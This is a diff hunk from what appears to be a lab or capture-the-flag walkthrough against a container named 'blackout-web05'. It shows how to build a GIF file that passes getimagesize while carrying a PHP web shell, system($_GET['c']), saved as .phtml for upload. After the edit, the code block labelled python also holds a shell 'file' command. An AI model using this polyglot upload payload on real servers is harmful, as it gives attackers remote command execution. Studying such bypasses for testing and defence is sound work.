@@ -77,11 +77,9 @@ $ sudo docker exec blackout-web05 cat /etc/apache2/conf-available/zzz-portal.con
 
 **Tool:** `python3` + `curl`. **Why:** construct a valid 1×1 GIF (header bytes that `getimagesize` recognizes) and append a PHP payload at the end; when served as `.phtml`, PHP executes it.
 
-```bash
-$ python3 -c "
+```python
 gif = open('/tmp/base.gif','rb').read()
 open('/tmp/evidencia.phtml','wb').write(gif + b'<?php system(\$_GET[\"c\"]); ?>')
-"
 $ file /tmp/evidencia.phtml
 GIF image data, version 89a, 1 x 1     # passes getimagesize
 ```
